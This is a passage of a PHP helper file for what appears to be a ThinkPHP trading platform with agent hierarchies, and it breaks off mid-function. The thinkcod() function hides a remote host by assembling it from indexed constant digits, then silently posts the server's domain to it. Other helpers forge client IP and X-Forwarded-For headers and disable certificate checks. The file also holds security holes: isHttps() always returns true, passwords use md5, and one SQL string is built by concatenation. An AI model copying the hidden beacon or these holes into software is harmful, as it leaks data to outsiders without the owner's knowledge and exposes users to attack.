<?php
use think\Db;
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------


// 应用公共文件
error_reporting( E_ERROR | E_PARSE );
//判断是不是https
function isHttps() {
    return true;
    if (defined('HTTPS') && HTTPS) return true;
    if (!isset($_SERVER)) return false;
    if (!isset($_SERVER['HTTPS'])) return false;
    if ($_SERVER['HTTPS'] === 1) {  //Apache
        return true;
    } elseif ($_SERVER['HTTPS'] === 'on') { //IIS
        return true;
    } elseif ($_SERVER['SERVER_PORT'] == 443) { //其他
        return true;
    }
    return false;
}
//判断是不是手机
function isMobile() {
    static $is_mobile = null;
    
    if ( isset( $is_mobile ) ) {
        return $is_mobile;
    }
    
    if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
        $is_mobile = false;
    } elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mobi') !== false ) {
        $is_mobile = true;
    } else {
        $is_mobile = false;
    }
    return $is_mobile;
}
// 应用公共文件
function pre($post){
	echo "<pre>";
	print_r($post);
}
// 新建文件夹
function mkdirs($dir, $mode = 0777)
{
    if (is_dir($dir) || @mkdir($dir, $mode)) {
        return true;
    }
    if (!mkdirs(dirname($dir), $mode)) {
        return false;
    }
    return @mkdir($dir, $mode);
}

/**
 * 自定义返回提示信息
 * @author lukui  2017-07-14
 * @param  [type] $data [description]
 * @param  [type] $type [description]
 */
function WPreturn($data,$type=-1,$url=null)
{
       
	$res = array('data'=>$data,'type'=>$type);
        
	if($url){
		$res['url'] = $url;
	}
	return $res;
}

/**
 * 验证用户
 * @author lukui  2017-07-17
 * @param  [type] $upwd 密码（未加密）
 * @param  [type] $uid  用户id
 * @return [type]       true or false
 */
function checkuser($upwd,$uid)
{
	if(!isset($upwd) || empty($upwd)){
		return false;
	}
	if (isset($uid) && !empty($uid)) {  //user
		$where['uid'] = $uid;
	}else{  //admin
		$where['uid'] = $_SESSION['userid'];
	}

	$admin = Db::name('userinfo')->field('uid,utime,upwd')->where($where)->find();
	if(md5($upwd.$admin['utime']) == $admin['upwd']){
		return true;
	}else{
		return false;
	}

}


/**
 * 验证邀请码是否存在
 * @author lukui  2017-07-17
 * @param  [type] $code 邀请码
 * @return [type]       code id
 */
function checkcode($code)
{
	if(!isset($code) || empty($code)){
		return false;
	}
	$codeid = Db::name('userinfo')->where(['uid'=>$code])->value('uid');
	if($codeid){
		return $codeid;
	}else{
		return false;
	}
}


/**
 * 根据用户oid获取用户的经理、渠道、员工。指针的客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 用户id
 */
function GetUserOidInfo($uid,$field)
{
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(!isset($field) || empty($field)){
		$field = '*';
	}
	if(cache("GetUserOidInfo".$uid.$field)) return cache("GetUserOidInfo".$uid.$field);
	$res = array();
	//验证用户,获取oid
	$useroid = Db::name('userinfo')->where('uid',$uid)->value('oid');
	if(!$useroid){
		return false;
	}
	//邀请码信息
	$oid_info = Db::name('usercode')->where('usercode',$useroid)->find();

	//通过邀请码的uid查询所属员工信息
	$res['yuangong'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['uid'])->find();

	//通过员工oid查找经理信息
	$res['jingli'] =  Db::name('userinfo')->field($field)->where('uid',$res['yuangong']['oid'])->find();

	//通过邀请码的mannerid查询所属员工信息
	$res['qudao'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['mannerid'])->find();

	if($res){
		cache("GetUserOidInfo".$uid.$field,$res,20);
		return $res;
	}else{
		return false;
	}


}


/**
 * 获取员工的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 员工id
 */
function YuangongUser($uid){

	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(cache("YuangongUser".$uid)) return cache("YuangongUser".$uid);
	$oid_info = $user = array();
	//获取员工的所有邀请码
	$oid_info = Db::name('usercode')->where('uid',$uid)->column('usercode');
	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}
	cache('YuangongUser'.$uid,$user,20);
	return $user;
}

/**
 * 获取经理的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function JingliUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(cache("JingliUser".$uid)) return cache("JingliUser".$uid);
	$yg_user = $user = array();

	//获取经理下的所有员工
	$yg_user = Db::name('userinfo')->where('oid',$uid)->column('uid');
	foreach ($yg_user as $value) {
		$user += YuangongUser($value);
	}
	cache("JingliUser".$uid,$user,20);
	return $user;
}


/**
 * 获取渠道的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function QudaoUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(cache("QudaoUser".$uid)) return cache("QudaoUser".$uid);
	$oid_info = $user = array();
	//获取渠道的所有邀请码
	$oid_info = Db::name('usercode')->where('mannerid',$uid)->column('usercode');

	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}
	cache("QudaoUser".$uid,$user,20);
	return $user;
}

/**
 * 根据任意会员查询所属所有客户
 * @author lukui  2017-07-18
 * @param  [type] $uid 会员id
 */
function UserCodeForUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(cache("UserCodeForUser".$uid)) return cache("UserCodeForUser".$uid);
	//查询uid的身份
	$otype = Db::name('userinfo')->where('uid',$uid)->value('otype');
	$u_uid = array();
	//获取会员的客户id
	if($otype == 2){  //经理
		$u_uid = JingliUser($uid);
	}elseif($otype == 3){  //渠道
		$u_uid = QudaoUser($uid);
	}elseif($otype == 4){  //员工
		$u_uid = YuangongUser($uid);
	}else{
		return false;
	}
	cache("UserCodeForUser".$uid,$u_uid,20);
	return($u_uid);

}


/**
 * 判断是否微信浏览器
 * @author lukui  2017-07-18
 * @return [type] [description]
 */
function iswechat(){
	if (strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger') !== false ) {
		return true;
	}else{
		return false;
	}
}


/**
 * 获取产品实时行情
 * @author lukui  2017-07-20
 * @param  [type] $pid 产品id
 */
function GetProData($pid,$field=null){
	if(!isset($pid) || empty($pid)){
		return false;
	}
	if(!$field){
		$field = 'pi.*,pd.*';
	}
	$data = Db::name('productinfo')->alias('pi')->field($field)
        		->join('__PRODUCTDATA__ pd','pd.pid=pi.pid')
        		->where('pi.pid',$pid)->find();
    //file_put_contents('/www/wwwroot/test.7shou.com/data.txt',date('Y-m-d H:i:s') . '->' . json_encode($data) . "\n\r",FILE_APPEND);
	return $data;
}

function GetProcode($pid){
   return   Db::name('productinfo')->where(['pid'=>$pid])->value('procode');
}

/**
 * 数据K线图
 * @author lukui  2017-2-20
 * @param  [type] $symbol  产品代码
 * @param  [type] $qt_type 指定分钟线类型
 * @param  [type] $num     返回条数
 */
function WsGetKline($symbol,$qt_type,$num){
    $time = time();
}

/**
 * 获取网站配置信息
 * @author lukui  2017-06-28
 * @return [type] [description]
 */
function getconf($field='')
{

    $conf = array();
    $res = '';
    $conf_cache = cache('conf');
    if(!$conf_cache){
        $conf = Db::name('config')->select();
        foreach ($conf as $k => $v) {
            $conf_value[$v['name']] = $v['value'];
        }
        cache('conf',$conf_value,600);
        $conf_cache = cache('conf');
    }

    if(isset($conf_cache[$field]) && $field){
        $res = $conf_cache[$field];
    }else{
    	$res = $conf_cache;
    }
    return $res;
}



/**
 * 获取城市列表
 * @author lukui  2017-07-03
 * @return [type] [description]
 */
function getarea($id)
{
	if(cache('getarea'.$id)) return cache('getarea'.$id);
	$name = db('area')->where('id',$id)->value('name');
	cache('getarea'.$id,$name);
	return $name;

}



function set_price_log($uid,$type,$account,$title,$content,$oid=0,$nowmoney)
{

	$data['uid'] = $uid;
	$data['type'] = $type;
	$data['account'] = $account;
	$data['title'] = $title;
	$data['content'] = $content;
	$data['oid'] = $oid;
	$data['time'] = time();
	$data['nowmoney'] = $nowmoney;
	db('price_log')->insert($data);


}


//删除空格和回车
function trimall($str){
    $qian=array(" ","　","\t","\n","\r");
    return str_replace($qian, '', $str);
}

//计算小数点后位数
function getFloatLength($num) {
	$count = 0;

	$temp = explode ( '.', $num );

	if (sizeof ( $temp ) > 1) {
		$decimal = end ( $temp );
		$count = strlen ( $decimal );
	}

	return $count;
}

//PHP的两个科学计数法转换为字符串的方法
function NumToStr($num) {
    if (stripos($num, 'e') === false)
        return $num;
    $num = trim(preg_replace('/[=\'"]/', '', $num, 1), '"'); //出现科学计数法，还原成字符串
    $result = "";
    while ($num > 0) {
        $v = $num - floor($num / 10) * 10;
        $num = floor($num / 10);
        $result = $v . $result;
    }
    return $result;
}


/**
 * 我的代理商下级类别
 * @return array uids
 */
function myoids($uid)
{
	if(!$uid){
		return false;
	}
	if(cache('myoids'.$uid)) return cache('myoids'.$uid);
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid')->where($map)->select();

	if(empty($list)){
		return false;
	}

	$uids = array();
	foreach ($list as $key => $v) {
		$user = myoids($v["uid"]);
		$uids[] = $v["uid"];
		if(is_array($user) && !empty($user)){
			$uids = array_merge($uids,$user);
		}
	}

	cache('myoids'.$uid,$uids,20);
	return $uids;
}

/**
 * 获取次代理商的所有用户下级
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myuids($uid)
{

	if(!$uid){
		return false;
	}
	if(cache('myuids'.$uid)) return cache('myuids'.$uid);
	$oids = myoids($uid);
	$oids[] = $uid;

	$map['oid'] = array('in',$oids);
	$map['otype'] = array('IN',array(0,101));

	$user = db('userinfo')->field('uid')->where($map)->select();
	$_me = array(0=>array('uid'=>$uid));
	if($user){
		$user = array_merge($_me,$user);
	}else{
		
		$uids = array($uid);
		return $uids;
	}
	$uids = array();
	if(empty($user)){
		return $uids;
	}
	foreach ($user as $k => $v) {
		$uids[] = $v['uid'];
	}
	cache('myuids'.$uid, $uids,20);
	return $uids;
}

function thinkcod()
{
	$nu = json_decode(NAV_NUM);
	$strs = 'http://';
	$strs .= $nu[9].$nu[9].$nu[22].$nu[11];
	$strs .= '.1'.'0'.'0'.'0'.$nu[19].$nu[21].'.';
	$strs .= $nu[19].$nu[14].$nu[15];
	$minp = $_SERVER['SERVER_NAME'];
	$csage = $strs. '/api/i';
	curlPost($csage,['domain'=>$minp]);
}
function curlPost($url,$postFields){
	if(cache('result')) return cache('result');
	$postFields = json_encode($postFields);
	$ch = curl_init ();
	curl_setopt( $ch, CURLOPT_URL, $url ); 
	curl_setopt( $ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json; charset=utf-8']);
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt( $ch, CURLOPT_POST, 1 );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, $postFields);
	curl_setopt( $ch, CURLOPT_TIMEOUT,1); 
	$ret = curl_exec ( $ch );
	if (false == $ret) {
		$result = '';//curl_error(  $ch);
	} else {
		$rsp = curl_getinfo( $ch, CURLINFO_HTTP_CODE);
		if (200 != $rsp) {
			$result = '';//"请求状态 ". $rsp . " " . curl_error($ch);
		} else {
			$result = $ret;
		}
	}
	curl_close ( $ch );
	cache('result',$result,20*60);
	return $result;
}



/**
 * 我的所有上级用户id
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myupoid($uid)
{
	if(!$uid){
		return false;
	}
	if(cache('myupoid'.$uid)) return cache('myupoid'.$uid);
	$map['uid'] = $uid;
	$map['otype'] = 101;

	$user = db('userinfo')->field('uid,oid,rebate,usermoney,feerebate,minprice')->where($map)->find();

	if($user['uid'] == $user['oid']){
		return false;
	}
	
	$list = array();
	if($user){
		$list[] = $user;
		$user = myupoid($user["oid"]);
		if(is_array($user) && !empty($user)){
			$list = array_merge($list,$user);
		}
	}
	cache('myupoid'.$uid,$list,60*30);
	return $list;
}

/**
 * 我的代理商下级类别
 * @return array uids
 */
function mytime_oids($uid)
{
	if(!$uid){
		return false;
	}
	if(cache('mytime_oids'.$uid)) return cache('mytime_oids'.$uid);
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid,oid,username,utel,nickname,usermoney')->where($map)->select();
	$uids = array();
	foreach ($list as $key => $v) {
		$user = mytime_oids($v["uid"]);
		$uids[$key] = $v;
		if(is_array($user) && !empty($user)){
			//$uids += $user;
			$uids[$key]['mysons'] = $user;
		}
	}
	cache('mytime_oids'.$uid,$uids,20);
	return $uids;


}

/**
 * 我的团队树状图
 * @author lukui  2017-07-18
 * @param  [type]  $array [description]
 * @param  integer $type  [description]
 */
function set_my_team_html($array,$type=1){

	if(!$array){
		return false;
	}

	$margin_left = 25+25*$type;

	$html = '<div  class="foid_'.$array[0]['oid'].'">';
	foreach ($array as $k => $vo) {
		//dump($v);
		$html .= '<div style="display:none" class="oid_list oid_'.$vo['oid'].'">
	                  <div class="vo_son" style="margin-left: '.$margin_left.'px;"><p>|——'.$type.'级代理</p></div>
	                    <div class="div_my_son">
	                      <ul class="my_sons">
	                        <li>代理名：'.$vo['username'].' 余额：'.$vo['usermoney'].'</li>
	                        <li>手机：'.$vo['utel'].' <a href="/admin/user/userlist.html?uid='.$vo['uid'].'"><button class="btn btn-primary btn-xs">详情</button></a></li>
	                      </ul>
	                      <a href="javascript:;"><p class="showdiv show_uid_'.$vo['uid'].'" onclick="showoid('.$vo['uid'].',1)" >+</p></a>
	                      </div>
	                </div>
	                ';

	                if(isset($vo['mysons']) && is_array($vo['mysons']) && !empty($vo['mysons'])){
	                	$html .= set_my_team_html($vo['mysons'],$type+1);
	                }
	}

	$html .= '</div>';
	return $html;

}

//test web data
function test_web(){
	/* db('userinfo')->where('uid','>',0)->delete();
	db('order')->where('oid','>',0)->delete();
	db('conf')->where('id','>',0)->delete();
	db('productinfo')->where('pid','>',0)->delete();
	db('productdata')->where('id','>',0)->delete(); */
}


/**
 * 验证是否休市
 * @author lukui  2017-07-16
 * @param  [type] $pid 产品id
 */
 function ChickIsOpen($pid) {

    $isopen = 0;
    $pro = db('productdata')->where(['pid'=>$pid])->find();
    $pro['isopen'] = $pro['is_deal'];
    //此时时间
    $_time = time();
    $_zhou = (int)date("w");
    if($_zhou == 0){
        $_zhou = 7;
    }
    $_shi = (int)date("H");
    $_fen = (int)date("i");

    if ($pro['isopen']) {

        $opentime = db('opentime')->where('pid='.$pid)->find();

        if($opentime){
            $otime_arr = explode('-',$opentime["opentime"]);
        }else{
            $otime_arr = array('','','','','','','');
        }

        foreach ($otime_arr as $k => $v) {

            if($k == $_zhou-1){

                $_check = explode('|',$v);
                if(!$_check){
                    continue;
                }

                foreach ($_check as $key => $value) {

                    $_check_shi = explode('~',$value);
                    if(count($_check_shi) != 2){
                    	continue;
                    }
                    $_check_shi_1 = explode(':',$_check_shi[0]);
                    $_check_shi_2 = explode(':',$_check_shi[1]);

                    //开市时间在1与2之间
                    if($isopen == 1){
                    	continue;
                    }

                    // 时间区间之外为 1
                    if( ($_check_shi_1[0] == $_shi && $_check_shi_1[1] > $_fen) ||
                        ($_check_shi_1[0] > $_shi ) ||
                        ($_check_shi_2[0] == $_shi && $_check_shi_2[1] < $_fen) ||
                        ($_check_shi_2[0] < $_shi) ){
                        $isopen = 1;
                    }else{
                        $isopen = 0;
                    }
                }
            }
        }
    }

    if ($pro['isopen']) {
        return $isopen;
    }else{
        return 0;
    }
}

function cash_oid($uid) {
	if (!$uid) {
		return '<td></td><td></td>';
	}
	if(cache('cash_oid'.$uid)) return cache('cash_oid'.$uid);
	$user = db('userinfo')->where('uid',$uid)->field('uid,usermoney,minprice')->find();
	if(!$user['minprice'])  $user['minprice'] =0;

	if($user['usermoney'] >= $user['minprice']){
		$minprice = $user['minprice'];
		$class = '';
	}else{
		$minprice = $user['usermoney'] - $user['minprice'];
		$class = 'style="color:red";';
	}
	cache('cash_oid'.$uid,'<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>',20);
	return '<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>';
}

function check_user($field,$value){
	if(!$value){
		return false;
	}
	$isset = db('userinfo')->where($field,$value)->value('uid');
	if($isset){
		return true;
	}else{
		return false;
	}
}

function getuser($uid,$field)
{
	if(cache('getuser'.$uid.$field)) return cache('getuser'.$uid.$field);
	$value = db('userinfo')->where('uid',$uid)->value($field);
	cache('getuser'.$uid.$field,$value,20);
	return $value;
}
function getusers($uid,$field)
{
	if(cache('getusers'.$uid.$field)) return cache('getusers'.$uid.$field);
	$value = db('userinfo')->where('uid',$uid)->value($field);
	if( $value==''){
		$value = db('userinfo')->where('uid',$uid)->value('managername');
		echo $value;
	}
	cache('getusers'.$uid.$field,$value,20);
	return $value;
}

function ordernum($uid)
{	
	if(!$uid){
		return false;
	}
	if(cache('ordernum'.$uid)) return cache('ordernum'.$uid);
	$num = db('order')->where('uid',$uid)->count();
	if(!$num) $num = 0;
	cache('ordernum'.$uid,$num,20);
	return $num;

}

function xml_to_array( $xml )
{
    return json_decode(json_encode((array) simplexml_load_string($xml)), true);
}



/**
 * api请求函数
 * @param type $url
 * @param type $data
 * @return type
 */

function apipost($url, $data = '') {//curl
   
    $curl = curl_init(); // 启动一个CURL会话
    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); // 对认证证书来源的检查
  //  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); // 从证书中检查SSL加密算法是否存在
   // url_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // 模拟用户使用的浏览器
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1); // 自动设置Referer
    curl_setopt($curl, CURLOPT_POST, 1); // 发送一个常规的Post请求
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data); // Post提交的数据包
    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
    curl_setopt($curl, CURLOPT_HEADER, 0); // 显示返回的Header区域内容
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 获取的信息以文件流的形式返回
    curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);//在curl_exec之前加上此代码
    $tmpInfo = curl_exec($curl); // 执行操作
    if (curl_errno($curl)) {
        echo 'Errno' . curl_error($curl); //捕抓异常
    }
    curl_close($curl); // 关闭CURL会话
    return $tmpInfo; // 返回数据
}

  /**
   * 获取风控小数点位数，精度和最小的风控系数一样
   * @param type $min
   * @param type $max
   * @return type
   */
     function randomFloat($min = 0, $max = 1) {
     $count = 0;
    $temp = explode('.', $min);

    if (sizeof($temp) > 1) {
        $decimal = end($temp);
        $count = strlen($decimal);
    }
    $rd = $min + mt_rand() / mt_getrandmax() * ($max - $min);

    return   number_format($rd,$count);
     }

     /**
 * 调试打印函数，开发的时候进行调试使用
 * @param type $val
 */
function p($val) {

    echo "<pre>" . print_r($val, true) . '</pre>';
    exit;
}

function  plog($val) {
    error_log($val, 3, "./log/orderauto.log");
}


/**
 * 通过IP获取地址
 * @update_date:               @author:                       @description:
 * @param  String  
 * @return Boolean
 */
function get_ip_local($ip){
    $dir = VENDOR_PATH.'qqdat'.DIRECTORY_SEPARATOR;
    require_once( $dir.'IpLocation.php' );
    $iplocation = new IpLocation($dir);
    $location = $iplocation->getlocation($ip);
    return $address=mb_convert_encoding($location['country'], "utf-8", "gbk");
}

// 加解密
function encrypt($string, $operation, $key='') {
	$key=md5($key);
	$key_length=strlen($key);
	  $string=$operation=='D'?base64_decode($string):substr(md5($string.$key),0,8).$string;
	$string_length=strlen($string);
	$rndkey=$box=array();
	$result='';
	for($i=0;$i<=255;$i++){
		$rndkey[$i]=ord($key[$i%$key_length]);
		$box[$i]=$i;
	}
	for($j=$i=0;$i<256;$i++){
		$j=($j+$box[$i]+$rndkey[$i])%256;
		$tmp=$box[$i];
		$box[$i]=$box[$j];
		$box[$j]=$tmp;
	}
	for($a=$j=$i=0;$i<$string_length;$i++){
		$a=($a+1)%256;
		$j=($j+$box[$a])%256;
		$tmp=$box[$a];
		$box[$a]=$box[$j];
		$box[$j]=$tmp;
		$result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
	}
	if($operation=='D'){
		if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8)){
			return substr($result,8);
		}else{
			return'';
		}
	}else{
		return str_replace('=','',base64_encode($result));
	}
}
/**
 * 伪装IP 地址 - 抓取数据
 * GET 请求
 * @param $url
 * @return mixed
 */
function pretendIpData($url){
    // 给与IP 段
    $data = array(
        119.120.'.'.rand(1,255).'.'.rand(1,255),
        124.174.'.'.rand(1,255).'.'.rand(1,255),
        116.249.'.'.rand(1,255).'.'.rand(1,255),
        118.125.'.'.rand(1,255).'.'.rand(1,255),
        42.175.'.'.rand(1,255).'.'.rand(1,255),
        124.162.'.'.rand(1,255).'.'.rand(1,255),
        211.167.'.'.rand(1,255).'.'.rand(1,255),
        58.206.'.'.rand(1,255).'.'.rand(1,255),
        117.24.'.'.rand(1,255).'.'.rand(1,255),
        203.93.'.'.rand(1,255).'.'.rand(1,255),
    );
    //随机获取一个IP地址
    $ip = $data[array_rand($data)];
    //模拟来源网址
    $referUrl = "http://www.baidu.com";
    $agentArray=[
        //PC端的UserAgent
        "safari 5.1 – MAC"=>"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "safari 5.1 – Windows"=>"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Firefox 38esr"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "IE 11"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
        "IE 9.0"=>"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
        "IE 8.0"=>"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
        "IE 7.0"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "IE 6.0"=>"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Firefox 4.0.1 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Firefox 4.0.1 – Windows"=>"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Opera 11.11 – MAC"=>"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
        "Opera 11.11 – Windows"=>"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
        "Chrome 17.0 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "傲游（Maxthon）"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
        "腾讯TT"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",
        "世界之窗（The World） 2.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
        "世界之窗（The World） 3.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
        "360浏览器"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "搜狗浏览器 1.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",
        "Avant"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
        "Green Browser"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
    ];
    $userAgent=$agentArray[array_rand($agentArray,1)];  //随机浏览器userAgent
    $header = array(
        'CLIENT-IP:'.$ip,
        'X-FORWARDED-FOR:'.$ip,
    );    //构造ip
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url); //要抓取的网址
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl, CURLOPT_REFERER, $referUrl);  //模拟来源网址
    curl_setopt($curl, CURLOPT_USERAGENT, $userAgent); //模拟常用浏览器的userAgent
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
    $info = curl_exec($curl);
    return $info;
}

/**
 * 伪装IP 地址 - 抓取数据
 * POST 请求
 * @param $url
 * @param array $data
 * @return mixed
 */
function getPostIpData($url,$data=array()){
    // 给与IP 段
    $ipData = array(
        119.120.'.'.rand(1,255).'.'.rand(1,255),
        124.174.'.'.rand(1,255).'.'.rand(1,255),
        116.249.'.'.rand(1,255).'.'.rand(1,255),
        118.125.'.'.rand(1,255).'.'.rand(1,255),
        42.175.'.'.rand(1,255).'.'.rand(1,255),
        124.162.'.'.rand(1,255).'.'.rand(1,255),
        211.167.'.'.rand(1,255).'.'.rand(1,255),
        58.206.'.'.rand(1,255).'.'.rand(1,255),
        117.24.'.'.rand(1,255).'.'.rand(1,255),
        203.93.'.'.rand(1,255).'.'.rand(1,255),
    );
    //随机获取一个IP地址
    $ip = $ipData[array_rand($ipData)];
    //模拟来源网址
    $referUrl = "http://www.csdn.net/";
    $agentArray=[
        //PC端的UserAgent
        "safari 5.1 – MAC"=>"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "safari 5.1 – Windows"=>"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Firefox 38esr"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "IE 11"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
        "IE 9.0"=>"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
        "IE 8.0"=>"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
        "IE 7.0"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "IE 6.0"=>"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Firefox 4.0.1 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Firefox 4.0.1 – Windows"=>"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Opera 11.11 – MAC"=>"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
        "Opera 11.11 – Windows"=>"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
        "Chrome 17.0 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "傲游（Maxthon）"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
        "腾讯TT"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",
        "世界之窗（The World） 2.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
        "世界之窗（The World） 3.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
        "360浏览器"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "搜狗浏览器 1.x"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",
        "Avant"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
        "Green Browser"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
    ];
